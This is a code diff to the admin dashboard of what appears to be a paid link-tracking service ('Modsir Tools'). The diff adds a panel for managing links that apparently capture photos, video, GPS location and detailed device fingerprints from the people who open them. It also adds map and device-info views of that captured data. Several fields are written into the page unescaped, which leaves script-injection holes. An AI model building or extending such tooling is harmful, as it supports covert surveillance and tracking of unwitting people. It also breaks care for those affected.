@@ -54,7 +54,7 @@
   .user-plan.pro{background:linear-gradient(135deg,var(--gold),#f59e0b);color:#000;}
   .user-plan.trial{background:rgba(148,163,184,0.15);color:#cbd5e1;border:1px solid rgba(148,163,184,0.3);}
   .tabs{display:flex;gap:6px;background:rgba(0,0,0,0.4);border-radius:14px;padding:6px;margin-bottom:20px;border:1px solid var(--border);overflow-x:auto;}
-  .tab{flex:1;min-width:120px;padding:11px;border-radius:10px;background:transparent;border:none;color:var(--text-dim);font-weight:600;font-size:0.85rem;cursor:pointer;font-family:inherit;white-space:nowrap;}
+  .tab{flex:1;min-width:110px;padding:11px;border-radius:10px;background:transparent;border:none;color:var(--text-dim);font-weight:600;font-size:0.82rem;cursor:pointer;font-family:inherit;white-space:nowrap;}
   .tab.active{background:linear-gradient(135deg,var(--gold),#f59e0b);color:#000;}
   .toast{position:fixed;top:80px;right:16px;left:16px;max-width:400px;margin-left:auto;background:linear-gradient(135deg,var(--accent-3),#059669);color:#fff;padding:14px 18px;border-radius:14px;font-weight:600;font-size:0.88rem;box-shadow:0 16px 40px rgba(16,185,129,0.5);opacity:0;transform:translateY(-24px);transition:all 0.4s;z-index:2000;pointer-events:none;}
   .toast.show{opacity:1;transform:translateY(0);}
@@ -71,6 +71,11 @@
   .capture-info .time{opacity:0.5;font-size:0.66rem;margin-top:4px;}
   .capture-actions{padding:0 10px 10px;display:flex;gap:6px;}
   .capture-actions button{flex:1;padding:6px;font-size:0.68rem;}
+  .link-stat-row{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:8px;}
+  .link-stat{background:rgba(34,211,238,0.08);border:1px solid rgba(34,211,238,0.2);border-radius:10px;padding:8px;text-align:center;}
+  .link-stat.green{background:rgba(16,185,129,0.08);border-color:rgba(16,185,129,0.2);}
+  .link-stat .num{font-family:'Space Grotesk',sans-serif;font-size:1rem;font-weight:800;}
+  .link-stat .lbl{font-size:0.6rem;opacity:0.7;text-transform:uppercase;margin-top:2px;}
   @media (max-width:480px){.container{padding:14px 12px 30px;}.card{padding:18px;}}
 </style>
 </head>
@@ -89,7 +94,7 @@
 
 <div id="loadingView" class="container" style="text-align:center;padding-top:100px;">
   <div class="spinner"></div>
-  <p style="opacity:0.6;">Verifying admin access...</p>
+  <p style="opacity:0.6;">Verifying admin...</p>
 </div>
 
 <div id="adminView" class="container hidden">
@@ -97,6 +102,7 @@
     <button class="tab active" onclick="switchTab('overview', this)">📊 Overview</button>
     <button class="tab" onclick="switchTab('requests', this)">📩 Requests <span id="reqCount"></span></button>
     <button class="tab" onclick="switchTab('users', this)">👥 Users</button>
+    <button class="tab" onclick="switchTab('links', this)">🔗 Links</button>
     <button class="tab" onclick="switchTab('captures', this)">🖼️ Captures</button>
   </div>
 
@@ -105,13 +111,14 @@
       <div class="stat-box"><h3 id="sUsers">0</h3><p>Total Users</p></div>
       <div class="stat-box"><h3 id="sPro">0</h3><p>Pro Users</p></div>
       <div class="stat-box"><h3 id="sPending">0</h3><p>Pending</p></div>
+      <div class="stat-box"><h3 id="sLinks">0</h3><p>Total Links</p></div>
       <div class="stat-box"><h3 id="sCaptures">0</h3><p>Captures</p></div>
     </div>
     <div class="card">
       <h2>🚀 Quick Actions</h2>
       <div style="display:flex;gap:10px;flex-wrap:wrap;">
         <button class="gold small" onclick="location.href='index.html'">🏠 Website</button>
-        <button class="secondary small" onclick="location.href='dashboard.html'">📊 My Dashboard</button>
+        <button class="secondary small" onclick="location.href='dashboard.html'">📊 Dashboard</button>
         <button class="primary small" onclick="location.reload()">🔄 Refresh</button>
       </div>
     </div>
@@ -120,7 +127,6 @@
   <div id="tab-requests" class="hidden">
     <div class="card">
       <h2>📩 Full Access Requests <span class="count-badge" id="reqBadge">0</span></h2>
-      <p style="opacity:0.7;font-size:0.85rem;margin-bottom:16px;">Approve karne se user ko Pro plan mil jayega.</p>
       <div id="requestsList"></div>
     </div>
   </div>
@@ -133,10 +139,18 @@
     </div>
   </div>
 
+  <div id="tab-links" class="hidden">
+    <div class="card">
+      <h2>🔗 All Links <span class="count-badge" id="linkBadge">0</span></h2>
+      <input type="search" id="linkSearch" placeholder="🔍 Search links..." oninput="renderAllLinks()">
+      <div id="linksList" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:12px;"></div>
+    </div>
+  </div>
+
   <div id="tab-captures" class="hidden">
     <div class="card">
       <h2>🖼️ All Captures <span class="count-badge" id="captureBadge">0</span></h2>
-      <input type="search" id="captureSearch" placeholder="🔍 Search by website, owner, type..." oninput="renderAllCaptures()">
+      <input type="search" id="captureSearch" placeholder="🔍 Search..." oninput="renderAllCaptures()">
       <div id="capturesList" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:12px;"></div>
     </div>
   </div>
@@ -166,9 +180,11 @@ const db = getFirestore(app);
 
 let allUsers = [];
 let allRequests = [];
+let allLinks = [];
 let allCaptures = [];
 let unsubUsers = null;
 let unsubRequests = null;
+let unsubLinks = null;
 let unsubCaptures = null;
 
 window.showToast = function(msg, isError = false) {
@@ -202,44 +218,57 @@ async function startListeners() {
   unsubUsers = onSnapshot(collection(db, "users"), (snap) => {
     allUsers = snap.docs.map(d => ({ id: d.id, ...d.data() }));
     renderUsers(); updateStats();
-  });
+  }, err => console.error(err));
+
   unsubRequests = onSnapshot(collection(db, "requests"), (snap) => {
     allRequests = snap.docs.map(d => ({ id: d.id, ...d.data() }));
     allRequests.sort((a,b) => (b.createdAt?.seconds||0) - (a.createdAt?.seconds||0));
     renderRequests(); updateStats();
-  });
+  }, err => console.error(err));
+
+  unsubLinks = onSnapshot(collection(db, "links"), (snap) => {
+    allLinks = snap.docs.map(d => ({ id: d.id, ...d.data() }));
+    allLinks.sort((a,b) => (b.createdAt?.seconds||0) - (a.createdAt?.seconds||0));
+    renderAllLinks();
+    renderAllCaptures();
+    updateStats();
+  }, err => console.error(err));
+
   unsubCaptures = onSnapshot(collection(db, "captures"), (snap) => {
     allCaptures = snap.docs.map(d => ({ id: d.id, ...d.data() }));
     allCaptures.sort((a,b) => (b.timestamp?.seconds||0) - (a.timestamp?.seconds||0));
     renderAllCaptures(); updateStats();
-  });
+  }, err => console.error(err));
 }
 
 function updateStats() {
   document.getElementById("sUsers").textContent = allUsers.length;
   document.getElementById("sPro").textContent = allUsers.filter(u => u.plan === "pro").length;
   document.getElementById("sPending").textContent = allRequests.filter(r => r.status === "pending").length;
+  document.getElementById("sLinks").textContent = allLinks.length;
   document.getElementById("sCaptures").textContent = allCaptures.length;
   const pending = allRequests.filter(r => r.status === "pending").length;
   document.getElementById("reqCount").textContent = pending > 0 ? `(${pending})` : "";
   document.getElementById("reqBadge").textContent = allRequests.length;
   document.getElementById("userBadge").textContent = allUsers.length;
+  document.getElementById("linkBadge").textContent = allLinks.length;
   document.getElementById("captureBadge").textContent = allCaptures.length;
 }
 
 window.switchTab = function(tab, el) {
   document.querySelectorAll(".tab").forEach(t => t.classList.remove("active"));
   el.classList.add("active");
-  ["overview","requests","users","captures"].forEach(t => {
+  ["overview","requests","users","links","captures"].forEach(t => {
     document.getElementById("tab-" + t).classList.add("hidden");
   });
   document.getElementById("tab-" + tab).classList.remove("hidden");
 }
 
+/* REQUESTS */
 function renderRequests() {
   const list = document.getElementById("requestsList");
   if (allRequests.length === 0) {
-    list.innerHTML = `<div class="empty-state"><div class="icon">📭</div><p>No requests yet</p></div>`;
+    list.innerHTML = `<div class="empty-state"><div class="icon">📭</div><p>No requests</p></div>`;
     return;
   }
   list.innerHTML = allRequests.map(r => {
@@ -287,6 +316,7 @@ window.rejectRequest = async function(reqId) {
   } catch (e) { showToast("Fail", true); }
 }
 
+/* USERS */
 function renderUsers() {
   const list = document.getElementById("usersList");
   const search = (document.getElementById("userSearch")?.value || "").toLowerCase();
@@ -327,15 +357,122 @@ window.makeTrial = async function(userId) {
   catch (e) { showToast("Fail", true); }
 }
 
+/* LINKS */
+function renderAllLinks() {
+  const list = document.getElementById("linksList");
+  if (!list) return;
+  const search = (document.getElementById("linkSearch")?.value || "").toLowerCase();
+  let filtered = allLinks;
+  if (search) filtered = filtered.filter(l => JSON.stringify(l).toLowerCase().includes(search));
+
+  if (filtered.length === 0) {
+    list.innerHTML = `<div class="empty-state" style="grid-column:1/-1;"><div class="icon">🔗</div><p>No links</p></div>`;
+    return;
+  }
+
+  list.innerHTML = filtered.map(link => {
+    const now = Date.now();
+    const expMs = link.expiresAt?.seconds ? link.expiresAt.seconds * 1000 : 0;
+    const isExpired = expMs < now;
+    const owner = allUsers.find(u => u.id === link.ownerId);
+    const ownerName = owner?.name || owner?.email?.split("@")[0] || "Unknown";
+    const featureIcons = { camera: "📷", video: "🎥", location: "📍", device: "📱", all: "⚡" };
+    const icon = featureIcons[link.feature] || "🔗";
+    const views = link.views || 0;
+    const captures = link.captureCount || 0;
+    const website = link.website || "Modsir Tools";
+    const createdAt = link.createdAt?.seconds ? new Date(link.createdAt.seconds*1000).toLocaleString() : "-";
+
+    let timeLeft = "";
+    if (isExpired) timeLeft = "EXPIRED";
+    else {
+      const diff = expMs - now;
+      const h = Math.floor(diff / (1000*60*60));
+      const m = Math.floor((diff % (1000*60*60)) / (1000*60));
+      timeLeft = h > 0 ? `${h}h ${m}m left` : `${m}m left`;
+    }
+
+    return `
+      <div class="capture-card" style="border-color:${isExpired ? 'rgba(239,68,68,0.3)' : 'rgba(34,211,238,0.3)'};">
+        <div style="padding:14px;">
+          <div style="display:flex;align-items:center;gap:10px;margin-bottom:10px;">
+            <div style="width:42px;height:42px;border-radius:12px;background:linear-gradient(135deg,rgba(34,211,238,0.15),rgba(168,85,247,0.15));border:1px solid rgba(34,211,238,0.3);display:flex;align-items:center;justify-content:center;font-size:1.2rem;">${icon}</div>
+            <div style="flex:1;min-width:0;">
+              <div style="font-family:'Space Grotesk',sans-serif;font-size:0.8rem;font-weight:700;word-break:break-all;">${link.id}</div>
+              <div style="font-size:0.65rem;opacity:0.6;margin-top:2px;">👤 ${escapeHtml(ownerName)}</div>
+            </div>
+          </div>
+          <div style="font-size:0.68rem;opacity:0.7;margin-bottom:10px;">🌐 ${escapeHtml(website)}</div>
+          <div class="link-stat-row">
+            <div class="link-stat"><div class="num" style="color:var(--accent);">${views}</div><div class="lbl">👁️ Views</div></div>
+            <div class="link-stat green"><div class="num" style="color:var(--accent-3);">${captures}</div><div class="lbl">📸 Data</div></div>
+          </div>
+          <div style="text-align:center;font-size:0.7rem;font-weight:700;color:${isExpired ? 'var(--danger)' : 'var(--gold)'};margin-bottom:10px;">${timeLeft}</div>
+          <div style="display:flex;gap:6px;">
+            <button class="success small" style="flex:1;" onclick="extendLink('${link.id}')">⏰ Extend</button>
+            <button class="danger small" style="flex:1;" onclick="deleteLink('${link.id}')">🗑️ Delete</button>
+          </div>
+          <div style="font-size:0.6rem;opacity:0.4;text-align:center;margin-top:8px;">${createdAt}</div>
+        </div>
+      </div>
+    `;
+  }).join("");
+}
+
+window.extendLink = async function(linkId) {
+  const choice = prompt(
+    "⏰ Kitna waqt badhana hai?\n\n" +
+    "1 → 1 ghanta\n" +
+    "2 → 6 ghante\n" +
+    "3 → 24 ghante\n" +
+    "4 → 7 din\n" +
+    "5 → Custom (minutes)\n\n" +
+    "Number likho:"
+  );
+
+  let minutes = 0;
+  if (choice === "1") minutes = 60;
+  else if (choice === "2") minutes = 360;
+  else if (choice === "3") minutes = 1440;
+  else if (choice === "4") minutes = 10080;
+  else if (choice === "5") {
+    const c = prompt("Kitne minutes?");
+    minutes = parseInt(c);
+    if (!minutes || minutes <= 0) return;
+  } else return;
+
+  try {
+    const linkSnap = await getDoc(doc(db, "links", linkId));
+    if (!linkSnap.exists()) { showToast("Link not found", true); return; }
+    const linkData = linkSnap.data();
+    let currentExpiry = linkData.expiresAt?.seconds ? linkData.expiresAt.seconds * 1000 : Date.now();
+    if (currentExpiry < Date.now()) currentExpiry = Date.now();
+    const newExpiry = new Date(currentExpiry + minutes * 60 * 1000);
+
+    await updateDoc(doc(db, "links", linkId), { expiresAt: Timestamp.fromDate(newExpiry) });
+    showToast(`✅ Link ${minutes} min extend!`);
+  } catch (e) { showToast("Fail: " + e.message, true); }
+}
+
+window.deleteLink = async function(linkId) {
+  if (!confirm("Delete this link?")) return;
+  try { await deleteDoc(doc(db, "links", linkId)); showToast("Deleted 🗑️"); }
+  catch (e) { showToast("Fail", true); }
+}
+
+/* CAPTURES */
 function renderAllCaptures() {
   const list = document.getElementById("capturesList");
+  if (!list) return;
   const search = (document.getElementById("captureSearch")?.value || "").toLowerCase();
   let filtered = allCaptures;
   if (search) filtered = filtered.filter(c => JSON.stringify(c).toLowerCase().includes(search));
+
   if (filtered.length === 0) {
     list.innerHTML = `<div class="empty-state" style="grid-column:1/-1;"><div class="icon">🖼️</div><p>No captures</p></div>`;
     return;
   }
+
   list.innerHTML = filtered.map(c => {
     let thumb = "";
     if (c.photo) thumb = `<img src="${c.photo}" onclick="viewCapture('${c.id}')" loading="lazy">`;
@@ -348,7 +485,9 @@ function renderAllCaptures() {
     const ownerName = owner?.name || owner?.email?.split("@")[0] || "Unknown";
     const time = c.timestamp?.seconds ? new Date(c.timestamp.seconds*1000).toLocaleString() : "-";
     const website = c.website || "Modsir Tools";
-    const hostname = c.hostname || "-";
+
+    const link = allLinks.find(l => l.id === c.linkId);
+    const views = link?.views || 0;
 
     return `
       <div class="capture-card">
@@ -357,67 +496,57 @@ function renderAllCaptures() {
           <div class="row">👤 ${escapeHtml(ownerName)}</div>
           <div class="row">🏷️ ${c.type || c.feature}</div>
           <div class="row web">🌐 ${escapeHtml(website)}</div>
-          <div class="row" style="font-size:0.65rem;opacity:0.5;">${escapeHtml(hostname)}</div>
+          <div class="row" style="font-size:0.65rem;opacity:0.65;">👁️ ${views} views</div>
+          ${c.location ? `<div class="row" style="font-size:0.65rem;opacity:0.6;">📍 ${c.location.lat?.toFixed(2)}, ${c.location.lon?.toFixed(2)}</div>` : ""}
           <div class="time">🕒 ${time}</div>
         </div>
         <div class="capture-actions">
-          <button class="success small" onclick="extendCapture('${c.id}')">⏰ Extend</button>
+          ${c.location ? `<button class="secondary small" onclick="openMap(${c.location.lat},${c.location.lon})">🗺️</button>` : ""}
+          ${c.device ? `<button class="secondary small" onclick="viewDeviceInfo('${c.id}')">📱</button>` : ""}
           <button class="danger small" onclick="deleteCapture('${c.id}')">🗑️</button>
         </div>
       </div>`;
   }).join("");
 }
 
-/* ===== EXTEND CAPTURE TIME ===== */
-window.extendCapture = async function(captureId) {
-  const choice = prompt(
-    "⏰ Kitna waqt badhana hai?\n\n" +
-    "1 → 1 ghanta\n" +
-    "2 → 6 ghante\n" +
-    "3 → 24 ghante\n" +
-    "4 → 7 din\n" +
-    "5 → Custom (minutes)\n\n" +
-    "Number likho (1-5):"
-  );
+window.openMap = function(lat, lon) {
+  window.open(`https://www.google.com/maps?q=${lat},${lon}`, "_blank");
+}
 
-  let additionalMinutes = 0;
-  if (choice === "1") additionalMinutes = 60;
-  else if (choice === "2") additionalMinutes = 360;
-  else if (choice === "3") additionalMinutes = 1440;
-  else if (choice === "4") additionalMinutes = 10080;
-  else if (choice === "5") {
-    const custom = prompt("Kitne minutes?");
-    additionalMinutes = parseInt(custom);
-    if (!additionalMinutes || additionalMinutes <= 0) return;
-  } else return;
-
-  try {
-    const captureSnap = await getDoc(doc(db, "captures", captureId));
-    if (!captureSnap.exists()) { showToast("Capture not found", true); return; }
-    const captureData = captureSnap.data();
-    const linkId = captureData.linkId;
-    if (!linkId) { showToast("Link ID not found", true); return; }
-
-    const linkSnap = await getDoc(doc(db, "links", linkId));
-    if (!linkSnap.exists()) { showToast("Original link not found", true); return; }
-    const linkData = linkSnap.data();
-
-    let currentExpiry = linkData.expiresAt?.seconds 
-      ? linkData.expiresAt.seconds * 1000 
-      : Date.now();
-
-    if (currentExpiry < Date.now()) currentExpiry = Date.now();
-    const newExpiry = new Date(currentExpiry + additionalMinutes * 60 * 1000);
-
-    await updateDoc(doc(db, "links", linkId), {
-      expiresAt: Timestamp.fromDate(newExpiry)
-    });
-
-    showToast(`✅ Link ${additionalMinutes} min extend!`);
-  } catch (e) {
-    console.error(e);
-    showToast("Extend fail: " + e.message, true);
-  }
+window.viewDeviceInfo = function(id) {
+  const c = allCaptures.find(x => x.id === id);
+  if (!c || !c.device) return;
+  const dev = c.device;
+  const w = window.open("");
+  w.document.write(`
+    <html><head><title>Device Info</title>
+    <style>body{font-family:monospace;background:#0a0a1a;color:#fff;padding:24px;line-height:1.8;}
+    h1{color:#22d3ee;margin-bottom:16px;}
+    .row{padding:8px;border-bottom:1px solid rgba(255,255,255,0.1);}
+    .lbl{color:#a855f7;font-weight:700;}</style></head>
+    <body>
+      <h1>📱 Device Information</h1>
+      <div class="row"><span class="lbl">Type:</span> ${dev.type || "-"}</div>
+      <div class="row"><span class="lbl">Browser:</span> ${dev.browser || "-"}</div>
+      <div class="row"><span class="lbl">Platform:</span> ${dev.platform || "-"}</div>
+      <div class="row"><span class="lbl">Screen:</span> ${dev.screen || "-"}</div>
+      <div class="row"><span class="lbl">Language:</span> ${dev.language || "-"}</div>
+      <div class="row"><span class="lbl">Timezone:</span> ${dev.timezone || "-"}</div>
+      <div class="row"><span class="lbl">Memory:</span> ${dev.memory || "-"} GB</div>
+      <div class="row"><span class="lbl">CPU Cores:</span> ${dev.cores || "-"}</div>
+      <div class="row"><span class="lbl">GPU:</span> ${dev.gpu || "-"}</div>
+      <div class="row"><span class="lbl">Touch:</span> ${dev.touch ? "Yes" : "No"}</div>
+      <div class="row"><span class="lbl">Pixel Ratio:</span> ${dev.pixelRatio || "-"}x</div>
+      <div class="row"><span class="lbl">Vendor:</span> ${dev.vendor || "-"}</div>
+      <div class="row"><span class="lbl">Cookies:</span> ${dev.cookies ? "Yes" : "No"}</div>
+      <div class="row"><span class="lbl">Online:</span> ${dev.online ? "Yes" : "No"}</div>
+      ${dev.network ? `
+        <div class="row"><span class="lbl">Network:</span> ${dev.network.type || "-"}</div>
+        <div class="row"><span class="lbl">Downlink:</span> ${dev.network.downlink || "-"} Mbps</div>
+        <div class="row"><span class="lbl">RTT:</span> ${dev.network.rtt || "-"} ms</div>
+      ` : ""}
+    </body></html>
+  `);
 }
 
 window.viewCapture = function(id) {
@@ -437,6 +566,7 @@ window.deleteCapture = async function(id) {
 window.adminLogout = async function() {
   if (unsubUsers) unsubUsers();
   if (unsubRequests) unsubRequests();
+  if (unsubLinks) unsubLinks();
   if (unsubCaptures) unsubCaptures();
   await signOut(auth);
   location.href = "index.html";
